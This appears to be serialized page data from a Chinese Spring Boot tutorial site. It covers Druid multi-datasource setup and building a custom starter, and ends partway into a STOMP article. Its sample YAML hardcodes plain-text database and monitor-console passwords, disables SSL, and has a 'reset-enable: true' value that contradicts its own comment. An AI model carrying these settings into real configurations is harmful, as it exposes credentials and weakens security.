com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure\n  datasource:\n    # 配置监控\n    druid:\n      stat-view-servlet:\n        # 在1.1.9版本不需要，以上必须要\n        enabled: true\n        url-pattern: "/druid/*"\n        # IP白名单(没有配置或者为空，则允许所有访问)\n        allow: 127.0.0.1\n        # IP黑名单 (存在共同时，deny优先于allow)\n        deny: 192.168.1.73\n        # 禁用HTML页面上的“Reset All”功能\n        reset-enable: true\n        # 登录名\n        login-username: admin\n        # 登录密码\n        login-password: admin@2020\n      web-stat-filter:\n        enabled: true\n        url-pattern: "/*"\n        exclusions: "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*"\n    dynamic:\n      druid:\n        # 配置监控统计拦截的filters,去掉后，监控界面的sql无法统计\n        # filter 提供的所有log 是为了 输出JDBC执行的日志\n        filters: stat,wall\n        # 初始化连接大小\n        initial-size: 30\n        # 最小空闲连接数\n        min-idle: 20\n        # 最大连接数\n        maxActive: 200\n        # 获取连接时最大等待时间，单位毫秒，使用\n        maxWait: 10000\n        # maxWait 并发效率会有所下降，maxWait 会造成公平锁，useUnfairLock 使用非公平锁\n        useUnfairLock: true\n        # 检测连接是否可用的测试语句 如果为 null，testOnBorrow testOnReturn testWhileIdle 都不起作用\n        validation-query: \'select 1\'\n        # testWhileIdle(空闲时检测)：如果为true（默认true），当应用向连接池申请连接，并且testOnBorrow为false时，连接池将会判断连接是否处于空闲状态，如果是，则验证这条连接是否可用。\n        # testWhileIdle什么时候会起作用? 获取连接时 且 testOnBorrow=false testWhileIdle=true\n        testWhileIdle: true\n        # testOnBorrow(获取连接时检测) 检测池里连接的可用性 false 不检测 true 检测.但消耗性能。\n        # 假如连接池中的连接被数据库关闭了，应用通过连接池getConnection时，可能获取到这些不可用的连接，且这些连接如果不被其他线程回收的话，它们不会被连接池被废除，也不会重新被创建，\n        # 占用了连接池的名额，项目本身作为服务端，数据库链接被关闭，客户端调用服务端就会出现大量的timeout，客户端设置了超时时间，然而主动断开，服务端必然出现close_wait。\n        testOnBorrow: false\n        # 连接保持空闲而不被驱逐的最小时间,如果说连接的真正空闲时间 等于该值，则关闭物理连接\n        # minEvictableIdleTimeMillis: 30000\n        testOnReturn: false\n      primary: wiedp\n      datasource:\n        # 主库\n        wiedp:\n          url: jdbc:mysql://10.xx.xx.100:3306/wiedp?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          type: com.alibaba.druid.pool.DruidDataSource\n          username: xx\n#          password: xx@2020\n          password: mysql@dev.2020\n        # 采集库\n        iedp:\n          url: jdbc:mysql://10.xx.xx.101:3306/iedp?useUnicode=true&characterEncoding=UTF-8&autoReconnect=true&useSSL=false&zeroDateTimeBehavior=convertToNull&&serverTimezone=Asia/Shanghai\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          type: com.alibaba.druid.pool.DruidDataSource\n          username: xxxx\n          password: xxxx@xxxx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n官方完整案例',normalizedContent:'在 spring boot 整合中还是会出现问题。如下：\n\ndescription:\n\nfailed to configure a datasource: \'url\' attribute is not specified and no embedded datasource could be configured.\n\n\n1\n2\n3\n\n\n只需要在 配置文件中加如下：\n\nspring:\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.druiddatasourceautoconfigure\n\n\n1\n2\n3\n\n\n用的是 druid 的数据源，所以排除 druid 使用 spring boot 自带的。\n\n依赖\n\n\x3c!-- 数据持久相关配置 --\x3e\n<dependency>\n    <groupid>com.baomidou</groupid>\n    <artifactid>mybatis-plus-boot-starter</artifactid>\n    <version>${mybatis-plus}</version>\n</dependency>\n\n\x3c!-- 驱动 --\x3e\n<dependency>\n    <groupid>mysql</groupid>\n    <artifactid>mysql-connector-java</artifactid>\n</dependency>\n\n<dependency>\n    <groupid>com.alibaba</groupid>\n    <artifactid>druid-spring-boot-starter</artifactid>\n    <version>${db-drive}</version>\n</dependency>\n\n\x3c!-- 多数据源 --\x3e\n<dependency>\n    <groupid>com.baomidou</groupid>\n    <artifactid>dynamic-datasource-spring-boot-starter</artifactid>\n    <version>3.1.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n配置文件\n\nspring:\n  main:\n    allow-bean-definition-overriding: true\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.druiddatasourceautoconfigure\n  datasource:\n    # 配置监控\n    druid:\n      stat-view-servlet:\n        # 在1.1.9版本不需要，以上必须要\n        enabled: true\n        url-pattern: "/druid/*"\n        # ip白名单(没有配置或者为空，则允许所有访问)\n        allow: 127.0.0.1\n        # ip黑名单 (存在共同时，deny优先于allow)\n        deny: 192.168.1.73\n        # 禁用html页面上的“reset all”功能\n        reset-enable: true\n        # 登录名\n        login-username: admin\n        # 登录密码\n        login-password: admin@2020\n      web-stat-filter:\n        enabled: true\n        url-pattern: "/*"\n        exclusions: "*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*"\n    dynamic:\n      druid:\n        # 配置监控统计拦截的filters,去掉后，监控界面的sql无法统计\n        # filter 提供的所有log 是为了 输出jdbc执行的日志\n        filters: stat,wall\n        # 初始化连接大小\n        initial-size: 30\n        # 最小空闲连接数\n        min-idle: 20\n        # 最大连接数\n        maxactive: 200\n        # 获取连接时最大等待时间，单位毫秒，使用\n        maxwait: 10000\n        # maxwait 并发效率会有所下降，maxwait 会造成公平锁，useunfairlock 使用非公平锁\n        useunfairlock: true\n        # 检测连接是否可用的测试语句 如果为 null，testonborrow testonreturn testwhileidle 都不起作用\n        validation-query: \'select 1\'\n        # testwhileidle(空闲时检测)：如果为true（默认true），当应用向连接池申请连接，并且testonborrow为false时，连接池将会判断连接是否处于空闲状态，如果是，则验证这条连接是否可用。\n        # testwhileidle什么时候会起作用? 获取连接时 且 testonborrow=false testwhileidle=true\n        testwhileidle: true\n        # testonborrow(获取连接时检测) 检测池里连接的可用性 false 不检测 true 检测.但消耗性能。\n        # 假如连接池中的连接被数据库关闭了，应用通过连接池getconnection时，可能获取到这些不可用的连接，且这些连接如果不被其他线程回收的话，它们不会被连接池被废除，也不会重新被创建，\n        # 占用了连接池的名额，项目本身作为服务端，数据库链接被关闭，客户端调用服务端就会出现大量的timeout，客户端设置了超时时间，然而主动断开，服务端必然出现close_wait。\n        testonborrow: false\n        # 连接保持空闲而不被驱逐的最小时间,如果说连接的真正空闲时间 等于该值，则关闭物理连接\n        # minevictableidletimemillis: 30000\n        testonreturn: false\n      primary: wiedp\n      datasource:\n        # 主库\n        wiedp:\n          url: jdbc:mysql://10.xx.xx.100:3306/wiedp?useunicode=true&characterencoding=utf-8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai\n          driver-class-name: com.mysql.cj.jdbc.driver\n          type: com.alibaba.druid.pool.druiddatasource\n          username: xx\n#          password: xx@2020\n          password: mysql@dev.2020\n        # 采集库\n        iedp:\n          url: jdbc:mysql://10.xx.xx.101:3306/iedp?useunicode=true&characterencoding=utf-8&autoreconnect=true&usessl=false&zerodatetimebehavior=converttonull&&servertimezone=asia/shanghai\n          driver-class-name: com.mysql.cj.jdbc.driver\n          type: com.alibaba.druid.pool.druiddatasource\n          username: xxxx\n          password: xxxx@xxxx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n官方完整案例',charsets:{cjk:!0}},{title:"SpringBoot 之 Starter",frontmatter:{title:"SpringBoot 之 Starter",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/201/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/201.SpringBoot%20%E4%B9%8B%20Starter.html",relativePath:"01.框架/01.Spring/03.spring boot/201.SpringBoot 之 Starter.md",key:"v-23c6095a",path:"/spring/spring-boot/201/",headers:[{level:2,title:"一、starter依赖",slug:"一、starter依赖",normalizedTitle:"一、starter 依赖",charIndex:311},{level:2,title:"二、添加配置类",slug:"二、添加配置类",normalizedTitle:"二、添加配置类",charIndex:718},{level:2,title:"添加加载类",slug:"添加加载类",normalizedTitle:"添加加载类",charIndex:1894},{level:2,title:"四、指定加载文件路径",slug:"四、指定加载文件路径",normalizedTitle:"四、指定加载文件路径",charIndex:5706},{level:2,title:"五、介绍下其他条件装配注解",slug:"五、介绍下其他条件装配注解",normalizedTitle:"五、介绍下其他条件装配注解",charIndex:6516},{level:2,title:"六、升级到 SpringBoot3 使用 starter",slug:"六、升级到-springboot3-使用-starter",normalizedTitle:"六、升级到 springboot3 使用 starter",charIndex:7103}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"一、starter依赖 二、添加配置类 添加加载类 四、指定加载文件路径 五、介绍下其他条件装配注解 六、升级到 SpringBoot3 使用 starter",content:'Spring Boot Starter 是一组可重用的依赖库，它们提供了一种快速启动 Spring Boot 应用程序的方式。每个 Starter 都包含了一组预配置的依赖项和自动配置类，使得使用者可以轻松地集成各种不同的功能模块，而无需手动配置大量的依赖项和参数。这样，开发人员可以更加专注于业务逻辑的实现，而不需要关心底层的配置和集成细节。\n\nSpring Boot Starter 的意义在于减少了应用程序的开发成本和复杂度，提高了开发效率和代码质量，并且支持更快的迭代和部署。另外，社区也提供了很多常用的 Starter，如数据库、Web 框架、安全框架等，可以直接使用，也可以通过定制来满足具体的需求。\n\n\n# 一、starter 依赖\n\n新建一个 spring boot 工程。\n\n\x3c!-- 包含了log 以及 autoconfigure 等 --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter</artifactId>\n</dependency>\n\n\x3c!-- 对 @ConfigurationProperties 的处理 --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 二、添加配置类\n\npackage com.xianwt.cloud.properties;\n\nimport lombok.Data;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.stereotype.Component;\n\nimport java.util.List;\n\n/**\n * @Author big uncle\n * @Date 2019/11/27 9:27\n **/\n@ConfigurationProperties(prefix = "security.authentication")\n@Data\npublic class AuthenticationProperties {\n\n    /**\n     * token\n    **/\n    private String userToken = "USER:TOKEN:";\n    /**\n     * 拦截\n    **/\n    private String authorization = "Authorization";\n    /**\n     * 默认参数用户\n     **/\n    private String userKey = "default:user:";\n    /**\n     * 权限\n    **/\n    private String authorityKey = "USER:AUTHORITY:";\n    /**\n     * 用户访问资源锁 默认不拦截\n    **/\n    private Boolean authorityLock = false;\n    /**\n     * 项目过滤集合, 以逗号分割\n    **/\n    private List<String> projectUrl;\n    /**\n     * 特殊路径放弃拦截，走非 RequestData 方式\n     **/\n    private List<String> specialUrl;\n    /**\n     * 失败处理器\n    **/\n    private String failureUrl = "/failure/authenticationFilter";\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# 添加加载类\n\npackage com.xianwt.cloud.properties;\n\n/**\n * @Author big uncle\n * @Date 2020/3/29 10:58\n * @module\n **/\n\nimport com.xianwt.cloud.cep.AuthenticationCep;\nimport com.xianwt.cloud.cep.AuthorizationCep;\nimport com.xianwt.cloud.cep.ProjectUrlFilterCep;\nimport com.xianwt.cloud.cep.SpecialFilterCep;\nimport com.xianwt.cloud.cep.impl.AuthenticationCepImpl;\nimport com.xianwt.cloud.cep.impl.AuthorizationCepImpl;\nimport com.xianwt.cloud.cep.impl.ProjectUrlFilterCepImpl;\nimport com.xianwt.cloud.cep.impl.SpecialFilterCepImpl;\nimport com.xianwt.cloud.filter.AuthenticationFilter;\nimport com.xianwt.cloud.server.AuthenticationServerSource;\nimport com.xianwt.cloud.server.AuthorizationServerSource;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.EnableAutoConfiguration;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnBean;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnClass;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport javax.annotation.Resource;\n\n@Configuration\n@EnableConfigurationProperties({AuthenticationProperties.class})\npublic class AuthenticationConfiguration {\n\n    private static final Log log = LogFactory.getLog(AuthenticationFilter.class);\n\n    @Autowired\n    private AuthenticationProperties authenticationProperties;\n\n\n    public ProjectUrlFilterCep projectUrlFilterCep(){\n        return new ProjectUrlFilterCepImpl(authenticationProperties);\n    }\n\n    public SpecialFilterCep specialFilterCep(){\n        return new SpecialFilterCepImpl(authenticationProperties);\n    }\n\n    @Bean\n    public AuthenticationCep authenticationCep(AuthenticationServerSource authenticationServerSource){\n        AuthenticationCepImpl authenticationCep = new AuthenticationCepImpl(authenticationProperties,authenticationServerSource);\n        return authenticationCep;\n    }\n\n    @Bean\n    public AuthorizationCep authorizationCep(AuthorizationServerSource authorizationServerSource){\n        AuthorizationCepImpl authenticationCep = new AuthorizationCepImpl(authenticationProperties,authorizationServerSource);\n        return authenticationCep;\n    }\n\n\n    @Bean\n    public FilterRegistrationBean<AuthenticationFilter> testFilterRegistration(AuthenticationCep authenticationCep,AuthorizationCep authorizationCep) {\n        FilterRegistrationBean<AuthenticationFilter> registration = new FilterRegistrationBean<>();\n        AuthenticationFilter authenticationFilter = AuthenticationFilter.builder()\n                .authenticationProperties(authenticationProperties)\n                .specialFilterCep(specialFilterCep())\n                .projectUrlFilterCep(projectUrlFilterCep())\n                .authenticationCep(authenticationCep)\n                .authorizationCep(authorizationCep)\n                .build();\n        registration.setFilter(authenticationFilter);\n        //配置过滤路径\n        registration.addUrlPatterns("/*");\n        //设置filter名称\n        registration.setName("authenticationFilter");\n        //请求中过滤器执行的先后顺序，值越小越先执行\n        registration.setOrder(1);\n        return registration;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n最主要得就是注解，至于业务逻辑大家都是写自己得。\n\n\n# 四、指定加载文件路径\n\n在 resources 目录下新建 META-INF 文件夹，在 META-INF 文件夹下在新建 spring.factories 文件，且在文添加以下内容\n\n# Auto Configure\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=com.xianwt.cloud.properties.AuthenticationConfiguration\n\n\n1\n2\n\n\n不出问题大家发布后，在别的项目依赖自己的 jar 就可以了。但除了 EnableAutoConfiguration 外还有其他的一些类可以共我们使用：\n\n * EnableAutoConfiguration：指定自动配置类，启动会执行指定的类。\n * ApplicationContextInitializer：初始化应用程序上下文的回调接口，可以帮助我们拿到 applicationContext。\n * ApplicationListener：监听应用程序事件的回调接口，这里可以监听 ContextRefreshedEvent 当应用程序上下文被初始化或刷新时触发；ApplicationStartedEvent 当 Spring 应用程序上下文准备完毕后，但尚未运行时触发；ApplicationReadyEvent 当应用程序已经启动并准备好服务请求时触发；ContextClosedEvent 当应用程序上下文关闭时触发；也可以触发我们的自定义事件。\n * ConditionContributor：为自动配置提供额外的条件，可以用 @ConditionalOnProperty 来代替。\n * TemplateAvailabilityProvider：在运行时检查可用模板的策略接口，使用它们来确定是否存在正确的模板文件。\n\n\n# 五、介绍下其他条件装配注解\n\n@ConditionalOnBean 在当前上下文中存在某个对象时，才会实例化一个 Bean\n@ConditionalOnMissingBean 在当前上下文中不存在某个对象时，才会实例化一个 Bean\n@Conditiona lOnClass 表示当 class path 有指定的类时，配置生效。\n@ConditionalOnMissingClass 表示当 classpath 中没有指定的类的时候，配置生效。\n@ConditionalOnProperty 注解根据 name 来读取 Spring Boot 的 Environment 的 变量包含的属性，根据其值与 havingValue 的值比较结果决定配置是否生效。如果没有指定 havingValue ，只要属性不为 false ，配置都能生效。matcblfMissing 为例 意味着如果 Environment 没有包含 “message.center.enabled”，配置也能生效，默认为 false。\n@ConditionalOnExpression ，当表达式为 true 时，才会实例化一个 Bean ，支持 SpEL 表达式，比如根据配置文件中的某个值来决定配置是否生效。\n@ConditionalOnJava ，当存在指定的 Java 版本的时候。\n\n\n# 六、升级到 SpringBoot3 使用 starter\n\n在 SpringBoot2.7 就已经说明建议使用 META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports 的方式作为定义自动装配文件位置。而在 3.0 版本，已经是移除了 META-INF/spring.factories，所以我们继续通过 META-INF/spring.factories 文件定义将不在生效。\n\n\x3c!-- 添加依赖 --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-autoconfigure</artifactId>\n</dependency>\n\n\x3c!-- 对 @ConfigurationProperties 的处理 --\x3e\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n@AutoConfiguration\n@EnableConfigurationProperties(value = TestProperties.class)\npublic class TestAutoConfiguration {\n\n    @Bean\n    public TestTemplate testTemplate(){\n        return new TestTemplate ();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@AutoConfiguration 是 spring boot2.7 新引入的，自动配置类必须放进下面的文件里才算自动配置类\n\n在 META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports 文件里面添加\n\ncom.spring.demo.test.TestAutoConfiguration\n\n\n1\n',normalizedContent:'spring boot starter 是一组可重用的依赖库，它们提供了一种快速启动 spring boot 应用程序的方式。每个 starter 都包含了一组预配置的依赖项和自动配置类，使得使用者可以轻松地集成各种不同的功能模块，而无需手动配置大量的依赖项和参数。这样，开发人员可以更加专注于业务逻辑的实现，而不需要关心底层的配置和集成细节。\n\nspring boot starter 的意义在于减少了应用程序的开发成本和复杂度，提高了开发效率和代码质量，并且支持更快的迭代和部署。另外，社区也提供了很多常用的 starter，如数据库、web 框架、安全框架等，可以直接使用，也可以通过定制来满足具体的需求。\n\n\n# 一、starter 依赖\n\n新建一个 spring boot 工程。\n\n\x3c!-- 包含了log 以及 autoconfigure 等 --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter</artifactid>\n</dependency>\n\n\x3c!-- 对 @configurationproperties 的处理 --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 二、添加配置类\n\npackage com.xianwt.cloud.properties;\n\nimport lombok.data;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.stereotype.component;\n\nimport java.util.list;\n\n/**\n * @author big uncle\n * @date 2019/11/27 9:27\n **/\n@configurationproperties(prefix = "security.authentication")\n@data\npublic class authenticationproperties {\n\n    /**\n     * token\n    **/\n    private string usertoken = "user:token:";\n    /**\n     * 拦截\n    **/\n    private string authorization = "authorization";\n    /**\n     * 默认参数用户\n     **/\n    private string userkey = "default:user:";\n    /**\n     * 权限\n    **/\n    private string authoritykey = "user:authority:";\n    /**\n     * 用户访问资源锁 默认不拦截\n    **/\n    private boolean authoritylock = false;\n    /**\n     * 项目过滤集合, 以逗号分割\n    **/\n    private list<string> projecturl;\n    /**\n     * 特殊路径放弃拦截，走非 requestdata 方式\n     **/\n    private list<string> specialurl;\n    /**\n     * 失败处理器\n    **/\n    private string failureurl = "/failure/authenticationfilter";\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# 添加加载类\n\npackage com.xianwt.cloud.properties;\n\n/**\n * @author big uncle\n * @date 2020/3/29 10:58\n * @module\n **/\n\nimport com.xianwt.cloud.cep.authenticationcep;\nimport com.xianwt.cloud.cep.authorizationcep;\nimport com.xianwt.cloud.cep.projecturlfiltercep;\nimport com.xianwt.cloud.cep.specialfiltercep;\nimport com.xianwt.cloud.cep.impl.authenticationcepimpl;\nimport com.xianwt.cloud.cep.impl.authorizationcepimpl;\nimport com.xianwt.cloud.cep.impl.projecturlfiltercepimpl;\nimport com.xianwt.cloud.cep.impl.specialfiltercepimpl;\nimport com.xianwt.cloud.filter.authenticationfilter;\nimport com.xianwt.cloud.server.authenticationserversource;\nimport com.xianwt.cloud.server.authorizationserversource;\nimport lombok.extern.slf4j.slf4j;\nimport org.apache.commons.logging.log;\nimport org.apache.commons.logging.logfactory;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.enableautoconfiguration;\nimport org.springframework.boot.autoconfigure.condition.conditionalonbean;\nimport org.springframework.boot.autoconfigure.condition.conditionalonclass;\nimport org.springframework.boot.autoconfigure.condition.conditionalonproperty;\nimport org.springframework.boot.context.properties.enableconfigurationproperties;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.annotation.resource;\n\n@configuration\n@enableconfigurationproperties({authenticationproperties.class})\npublic class authenticationconfiguration {\n\n    private static final log log = logfactory.getlog(authenticationfilter.class);\n\n    @autowired\n    private authenticationproperties authenticationproperties;\n\n\n    public projecturlfiltercep projecturlfiltercep(){\n        return new projecturlfiltercepimpl(authenticationproperties);\n    }\n\n    public specialfiltercep specialfiltercep(){\n        return new specialfiltercepimpl(authenticationproperties);\n    }\n\n    @bean\n    public authenticationcep authenticationcep(authenticationserversource authenticationserversource){\n        authenticationcepimpl authenticationcep = new authenticationcepimpl(authenticationproperties,authenticationserversource);\n        return authenticationcep;\n    }\n\n    @bean\n    public authorizationcep authorizationcep(authorizationserversource authorizationserversource){\n        authorizationcepimpl authenticationcep = new authorizationcepimpl(authenticationproperties,authorizationserversource);\n        return authenticationcep;\n    }\n\n\n    @bean\n    public filterregistrationbean<authenticationfilter> testfilterregistration(authenticationcep authenticationcep,authorizationcep authorizationcep) {\n        filterregistrationbean<authenticationfilter> registration = new filterregistrationbean<>();\n        authenticationfilter authenticationfilter = authenticationfilter.builder()\n                .authenticationproperties(authenticationproperties)\n                .specialfiltercep(specialfiltercep())\n                .projecturlfiltercep(projecturlfiltercep())\n                .authenticationcep(authenticationcep)\n                .authorizationcep(authorizationcep)\n                .build();\n        registration.setfilter(authenticationfilter);\n        //配置过滤路径\n        registration.addurlpatterns("/*");\n        //设置filter名称\n        registration.setname("authenticationfilter");\n        //请求中过滤器执行的先后顺序，值越小越先执行\n        registration.setorder(1);\n        return registration;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n最主要得就是注解，至于业务逻辑大家都是写自己得。\n\n\n# 四、指定加载文件路径\n\n在 resources 目录下新建 meta-inf 文件夹，在 meta-inf 文件夹下在新建 spring.factories 文件，且在文添加以下内容\n\n# auto configure\norg.springframework.boot.autoconfigure.enableautoconfiguration=com.xianwt.cloud.properties.authenticationconfiguration\n\n\n1\n2\n\n\n不出问题大家发布后，在别的项目依赖自己的 jar 就可以了。但除了 enableautoconfiguration 外还有其他的一些类可以共我们使用：\n\n * enableautoconfiguration：指定自动配置类，启动会执行指定的类。\n * applicationcontextinitializer：初始化应用程序上下文的回调接口，可以帮助我们拿到 applicationcontext。\n * applicationlistener：监听应用程序事件的回调接口，这里可以监听 contextrefreshedevent 当应用程序上下文被初始化或刷新时触发；applicationstartedevent 当 spring 应用程序上下文准备完毕后，但尚未运行时触发；applicationreadyevent 当应用程序已经启动并准备好服务请求时触发；contextclosedevent 当应用程序上下文关闭时触发；也可以触发我们的自定义事件。\n * conditioncontributor：为自动配置提供额外的条件，可以用 @conditionalonproperty 来代替。\n * templateavailabilityprovider：在运行时检查可用模板的策略接口，使用它们来确定是否存在正确的模板文件。\n\n\n# 五、介绍下其他条件装配注解\n\n@conditionalonbean 在当前上下文中存在某个对象时，才会实例化一个 bean\n@conditionalonmissingbean 在当前上下文中不存在某个对象时，才会实例化一个 bean\n@conditiona lonclass 表示当 class path 有指定的类时，配置生效。\n@conditionalonmissingclass 表示当 classpath 中没有指定的类的时候，配置生效。\n@conditionalonproperty 注解根据 name 来读取 spring boot 的 environment 的 变量包含的属性，根据其值与 havingvalue 的值比较结果决定配置是否生效。如果没有指定 havingvalue ，只要属性不为 false ，配置都能生效。matcblfmissing 为例 意味着如果 environment 没有包含 “message.center.enabled”，配置也能生效，默认为 false。\n@conditionalonexpression ，当表达式为 true 时，才会实例化一个 bean ，支持 spel 表达式，比如根据配置文件中的某个值来决定配置是否生效。\n@conditionalonjava ，当存在指定的 java 版本的时候。\n\n\n# 六、升级到 springboot3 使用 starter\n\n在 springboot2.7 就已经说明建议使用 meta-inf/spring/org.springframework.boot.autoconfigure.autoconfiguration.imports 的方式作为定义自动装配文件位置。而在 3.0 版本，已经是移除了 meta-inf/spring.factories，所以我们继续通过 meta-inf/spring.factories 文件定义将不在生效。\n\n\x3c!-- 添加依赖 --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-autoconfigure</artifactid>\n</dependency>\n\n\x3c!-- 对 @configurationproperties 的处理 --\x3e\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-configuration-processor</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n@autoconfiguration\n@enableconfigurationproperties(value = testproperties.class)\npublic class testautoconfiguration {\n\n    @bean\n    public testtemplate testtemplate(){\n        return new testtemplate ();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n@autoconfiguration 是 spring boot2.7 新引入的，自动配置类必须放进下面的文件里才算自动配置类\n\n在 meta-inf/spring/org.springframework.boot.autoconfigure.autoconfiguration.imports 文件里面添加\n\ncom.spring.demo.test.testautoconfiguration\n\n\n1\n',charsets:{cjk:!0}},{title:"SpringBoot 之 Stomp 使用和 vue 相配置",frontmatter:{title:"SpringBoot 之 Stomp 使用和 vue 相配置",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/202/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/202.SpringBoot%20%E4%B9%8B%20Stomp%20%E4%BD%BF%E7%94%A8%E5%92%8C%20vue%20%E7%9B%B8%E9%85%8D%E7%BD%AE.html",relativePath:"01.框架/01.Spring/03.spring boot/202.SpringBoot 之 Stomp 使用和 vue 相配置.md",key:"v-1527c6e0",path:"/spring/spring-boot/202/",headers:[{level:2,title:"后端代码",slug:"后端代码",normalizedTitle:"后端代码",charIndex:2},{level:2,title:"前端代码",slug:"前端代码",normalizedTitle:"前端代码",charIndex:2352}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"后端代码 前端代码",content:'# 后端代码\n\n依赖\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-websocket</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.messaging.simp.config.MessageBrokerRegistry;\nimport 